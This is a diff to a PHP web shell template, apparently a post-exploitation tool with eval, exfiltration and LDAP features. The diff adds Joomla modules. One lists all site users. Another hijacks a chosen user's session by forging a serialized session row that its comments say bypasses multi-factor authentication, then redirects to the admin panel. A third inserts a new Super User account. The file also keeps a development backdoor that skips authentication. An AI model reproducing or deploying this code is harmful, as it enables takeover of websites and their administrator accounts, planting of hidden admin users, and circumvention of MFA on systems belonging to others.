@@ -1,8 +1,5 @@
 <?php
 /*
- * Version: 1.0.0
- * Build: 2024-04-13
- * Last change: 2024-05-01
  * Author: @Ebalo <https://github.com/ebalo55>
  * Minimum PHP version: 5.3
  * Description:
@@ -29,6 +26,7 @@ $QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
 $QUERY_LDAP              = "__FEAT_QUERY_LDAP__";
 $EVAL                    = "__FEAT_EVAL__";
 $IMPERSONATE_WP_USER     = "__FEAT_IMPERSONATE_WP_USER__";
+$IMPERSONATE_JOOMLA_USER = "__FEAT_IMPERSONATE_JOOMLA_USER__";
 
 $USERNAME = "__USERNAME__";
 $PASSWORD = "__PASSWORD__";
@@ -129,6 +127,17 @@ if (defined("__WP__") && __WP__) {
   <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
 </svg>',
     );
+}
+
+// Enable Joomla specific features
+if (defined("_JEXEC") && _JEXEC) {
+    $ENABLED_FEATURES[$IMPERSONATE_JOOMLA_USER] = [
+        "title"       => "Impersonate Joomla user",
+        "description" => "Impersonate a Joomla user by changing the current session.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
+</svg>',
+    ];
 }
 
 date_default_timezone_set("UTC");
@@ -1097,7 +1106,7 @@ function __PREFIX__handleCreateZip() {
     }
 
     $lines            = explode("\n", $content);
-    $path_replacement       = __PREFIX__getShortestCommonPath($lines);
+    $path_replacement = __PREFIX__getShortestCommonPath($lines);
     foreach ($lines as $line) {
         $parts = explode(',', trim($line)); // Split line by comma
         $path  = isset($parts[0]) ? $parts[0] : '';
@@ -2262,8 +2271,8 @@ function __PREFIX__getWPUsers() {
                         array(
                             __PREFIX__makeInput(
                                 "hidden",
-                                "__PARAM_1__",
                                 "username",
+                                "__PARAM_1__",
                                 "",
                                 "Username of the user to impersonate.",
                                 true,
@@ -2320,6 +2329,334 @@ function __PREFIX__handleImpersonateWPUser() {
     }
 }
 
+/**
+ * Get the list of Joomla users
+ *
+ * @return array{id: int, username: string, email: string, title: string}[] List of Joomla users
+ */
+function __PREFIX__getJoomlaUsers() {
+    // inject joomla dependencies
+    $container = \Joomla\CMS\Factory::getContainer();
+    $db        = $container->get("Joomla\Database\DatabaseInterface");
+
+    // create a new query object to retrieve user details along with group names
+    $query = $db->getQuery(true);
+
+    // build the query to retrieve user details and group names
+    $query->select(['u.id', 'u.username', 'u.email', 'g.title']);
+    $query->from($db->quoteName('#__users', 'u'));
+    $query->leftJoin($db->quoteName('#__user_usergroup_map', 'm') . ' ON u.id = m.user_id');
+    $query->leftJoin($db->quoteName('#__usergroups', 'g') . ' ON m.group_id = g.id');
+
+    // set the query conditions to retrieve only activated users:
+    // $query->where('u.block = 0');
+
+    // execute the query
+    $db->setQuery($query);
+
+    return array_map(
+        function ($data) {
+            global $IMPERSONATE_JOOMLA_USER;
+            return array_merge(
+                $data,
+                [
+                    "actions" => __PREFIX__makeForm(
+                        $IMPERSONATE_JOOMLA_USER,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            __PREFIX__makeInput(
+                                "hidden",
+                                "Username",
+                                "__PARAM_1__",
+                                "",
+                                "Username of the user to impersonate.",
+                                true,
+                                null,
+                                $data["username"],
+                            ),
+                        ],
+                        "post",
+                        "Impersonate",
+                        "flex flex-col max-w-xl mb-0",
+                    ),
+                ],
+            );
+        },
+        $db->loadAssocList(),
+    );
+}
+
+/**
+ * Handle the redirect of Joomla to the administration panel
+ *
+ * @return void
+ */
+function __PREFIX__redirectJoomlaToAdminPanel() {
+    // Get the base URL of the Joomla site
+    $baseUrl = JUri::base();
+
+    // Construct the URL to the administration panel
+    $adminUrl = $baseUrl . '../../../administrator/index.php';
+
+    // Redirect to the administration panel
+    JFactory::getApplication()
+        ->redirect($adminUrl);
+}
+
+/**
+ * Impersonate a Joomla user given a username
+ *
+ * @param $username string The username of the user to impersonate
+ *
+ * @return void
+ */
+function __PREFIX__impersonateJoomlaUser($username) {
+    // inject joomla dependencies
+    $container = \Joomla\CMS\Factory::getContainer();
+    /**
+     * @var \Joomla\Database\DatabaseDriver $db
+     */
+    $db = $container->get("Joomla\Database\DatabaseInterface");
+
+    // Get the user ID by username
+    $query = $db->getQuery(true)
+        ->select('id')
+        ->from('#__users')
+        ->where('username = :username')
+        ->bind(':username', $username);
+
+    $db->setQuery($query);
+    $result = $db->loadResult();
+
+    // Get the user object by id
+    $user = $container->get("Joomla\CMS\User\UserFactoryInterface")
+        ->loadUserById($result);
+
+    // create a new registry object to store the session data
+    $registry = new \Joomla\Registry\Registry();
+
+    // the registry must contain a session object (stdClass)
+    $session               = new \stdClass();
+    $session->token        = session_id();
+    $session->counter      = 5;
+    $session->timer        = new \stdClass();
+    $session->timer->start = time();
+    $session->timer->now   = time();
+    $session->timer->last  = time() + 60 * 60 * 24; // 24 hours
+    // add the session object to the registry
+    $registry->set("session", $session);
+
+    // the registry must contain another registry object (i don't know why yet...)
+    $_registry = new \Joomla\Registry\Registry();
+    $registry->set("registry", $_registry);
+
+    // the registry must contain a user object (a full user object directly retrieved from the database)
+    $registry->set("user", $user);
+
+    // if the user has MFA enabled, we need to bypass it, this should do the trick
+    $mfa_bypass              = new \stdClass();
+    $mfa_bypass->mfa_checked = 1;
+    $registry->set("com_users", $mfa_bypass);
+
+    // serialize the registry object and encode it in base64
+    $serializable_session = base64_encode(serialize($registry));
+    // then serialized the previous object and prepend it with the "joomla|" prefix
+    $serialized_session = "joomla|" . serialize($serializable_session);
+
+    // update the session data in the database
+    $client_id = 1;
+    $guest     = 0;
+    $query     = $db->getQuery(true)
+        ->update('#__session')
+        ->set('data = :data')
+        ->set('client_id = :client_id')
+        ->set('guest = :guest')
+        ->set('time = :time')
+        ->set('userid = :uid')
+        ->where('session_id = :session_id')
+        ->bind(':data', $serialized_session)
+        ->bind(':time', $session->timer->now)
+        ->bind(':uid', $user->id)
+        ->bind(':client_id', $client_id)
+        ->bind(':guest', $guest)
+        ->bind(":session_id", $session->token);
+    $db->setQuery($query);
+    $db->execute();
+
+    // redirect to the admin panel (if located at the default path)
+    __PREFIX__redirectJoomlaToAdminPanel();
+}
+
+/**
+ * Add a Joomla super user
+ *
+ * @param $username string The username of the super user
+ * @param $email string The email of the super user
+ * @param $password string The password of the super user
+ *
+ * @return void
+ */
+function __PREFIX__addJoomlaSuperUser($username, $email, $password) {
+    // inject joomla dependencies
+    $container = \Joomla\CMS\Factory::getContainer();
+    /**
+     * @var \Joomla\Database\DatabaseDriver $db
+     */
+    $db = $container->get("Joomla\Database\DatabaseInterface");
+
+    // Query to retrieve the group ID for Super Users
+    $query = $db->getQuery(true)
+        ->select($db->quoteName('id'))
+        ->from($db->quoteName('#__usergroups'))
+        ->where($db->quoteName('title') . ' = ' . $db->quote('Super Users'));
+
+    // Execute the query
+    $db->setQuery($query);
+    $groupId = $db->loadResult();
+
+    // hash the password
+    $password = JUserHelper::hashPassword($password);
+
+    // Insert the user into the #__users table
+    $query = $db->getQuery(true)
+        ->insert($db->quoteName('#__users'))
+        ->columns(
+            [
+                $db->quoteName('name'),
+                $db->quoteName('username'),
+                $db->quoteName('email'),
+                $db->quoteName('password'),
+                $db->quoteName('params'),
+                $db->quoteName('registerDate'),
+                $db->quoteName('lastvisitDate'),
+                $db->quoteName('lastResetTime'),
+            ],
+        )
+        ->values(
+            $db->quote($username) .
+            ', ' .
+            $db->quote($username) .
+            ', ' .
+            $db->quote($email) .
+            ', ' .
+            $db->quote($password) .
+            ', "", NOW(), NOW(), NOW()',
+        );
+    $db->setQuery($query);
+    $db->execute();
+
+    // Get the user ID of the newly inserted user
+    $userId = $db->insertid();
+
+    // Insert user-group mapping into #__user_usergroup_map table
+    $query = $db->getQuery(true)
+        ->insert($db->quoteName('#__user_usergroup_map'))
+        ->columns([$db->quoteName('user_id'), $db->quoteName('group_id')])
+        ->values($userId . ', ' . $groupId);
+    $db->setQuery($query);
+    $db->execute();
+}
+
+/**
+ * Handle the impersonate Joomla user operation and user creation operation
+ *
+ * @return void
+ */
+function __PREFIX__handleImpersonateJoomlaUser() {
+    if (!empty($_POST["__PARAM_1__"])) {
+        __PREFIX__impersonateJoomlaUser($_POST["__PARAM_1__"]);
+    }
+    elseif (!empty($_POST["__PARAM_2__"]) &&
+            !empty($_POST["__PARAM_3__"]) &&
+            !empty($_POST["__PARAM_4__"])) {
+
+        __PREFIX__addJoomlaSuperUser($_POST["__PARAM_2__"], $_POST["__PARAM_3__"], $_POST["__PARAM_4__"]);
+
+        echo __PREFIX__makeJoomlaImpersonatePage();
+    }
+}
+
+/**
+ * Make the Joomla impersonate page
+ *
+ * @return string The Joomla impersonate page
+ */
+function __PREFIX__makeJoomlaImpersonatePage() {
+    global $ENABLED_FEATURES, $IMPERSONATE_JOOMLA_USER;
+
+    $users = __PREFIX__getJoomlaUsers();
+    return __PREFIX__makePage(
+        [
+            __PREFIX__makePageHeader(
+                $ENABLED_FEATURES[$IMPERSONATE_JOOMLA_USER]["title"],
+                $ENABLED_FEATURES[$IMPERSONATE_JOOMLA_USER]["description"],
+            ),
+            __PREFIX__makeTable(
+                "Users",
+                "Joomla users to impersonate",
+                $users,
+                [
+                    "id"       => "Id",
+                    "username" => "Username",
+                    "email"    => "Email",
+                    "title"    => "Role",
+                    "actions"  => "Actions",
+                ],
+                "
+                        <dialog id='create-joomla-user' class='p-4 rounded w-1/3'>" .
+                __PREFIX__makeForm(
+                    $IMPERSONATE_JOOMLA_USER,
+                    $_SERVER["REQUEST_URI"],
+                    [
+                        "<div class='flex items-center justify-between'>
+                                        <h3 class='text-lg font-semibold text-zinc-800'>Create Joomla user</h3>
+                                        <button onclick='document.getElementById(\"create-joomla-user\").close(); document.getElementById(\"create-joomla-user\").classList.remove(\"flex\")' 
+                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
+                                            &times;
+                                        </button>
+                                    </div>",
+                        __PREFIX__makeInput(
+                            "text",
+                            "Username",
+                            "__PARAM_2__",
+                            "admin",
+                            "Username of the user to create.",
+                            true,
+                        ),
+                        __PREFIX__makeInput(
+                            "text",
+                            "Email",
+                            "__PARAM_3__",
+                            "admin@example.com",
+                            "Email of the user to create.",
+                            true,
+                        ),
+                        __PREFIX__makeInput(
+                            "password",
+                            "Password",
+                            "__PARAM_4__",
+                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                            "Password of the user to create.",
+                            true,
+                        ),
+                    ],
+                    "post",
+                    "Create user",
+                    "flex flex-col gap-y-6 mx-auto w-full",
+                )
+                . "
+                        </dialog>
+                        <button onclick='document.getElementById(\"create-joomla-user\").showModal()' 
+                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
+                                hover:bg-zinc-700 transition-all duration-300'>
+                            Create user
+                        </button>",
+            ),
+        ],
+        $IMPERSONATE_JOOMLA_USER,
+    );
+}
+
 // TEMPLATE DEVELOPMENT BACKDOOR - START
 // The following snippet is a backdoor that allows for template development without the need to authenticate.
 // This should be removed before deploying the template to a production environment.
@@ -2335,6 +2672,7 @@ $isolated_ops = array(
     $EXFILTRATE,
     $LOGIN,
     $IMPERSONATE_WP_USER,
+    $IMPERSONATE_JOOMLA_USER,
 );
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
@@ -2349,7 +2687,7 @@ if (!__PREFIX__isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPER
             break;
         case $FILE_EXTRACTION_PREVIEW:
         case $FILE_EXTRACTION:
-        $content = __PREFIX__makePage(
+            $content = __PREFIX__makePage(
                 array(
                     __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
@@ -2548,7 +2886,7 @@ if (!__PREFIX__isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPER
             ob_start();
             phpinfo();
             $php_info = ob_get_clean();
-            $content        = __PREFIX__makePage(
+            $content  = __PREFIX__makePage(
                 array(
                     __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
@@ -3027,6 +3365,9 @@ if (!__PREFIX__isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPER
                 $page
             );
             break;
+        case $IMPERSONATE_JOOMLA_USER:
+            $content = __PREFIX__makeJoomlaImpersonatePage();
+            break;
     }
 
     echo $content;
@@ -3045,8 +3386,8 @@ if (__PREFIX__isPost()) {
             break;
         case $FILE_EXTRACTION_PREVIEW:
         case $FILE_EXTRACTION:
-        __PREFIX__handleFileExtraction();
-            break;
+            __PREFIX__handleFileExtraction();
+        break;
         case $DIRECTORY_LISTING:
             __PREFIX__handleDirectoryListing();
             break;
@@ -3080,6 +3421,9 @@ if (__PREFIX__isPost()) {
             break;
         case $IMPERSONATE_WP_USER:
             __PREFIX__handleImpersonateWPUser();
+            break;
+        case $IMPERSONATE_JOOMLA_USER:
+            __PREFIX__handleImpersonateJoomlaUser();
             break;
         default:
             echo "Unrecognized operation '$operation'";
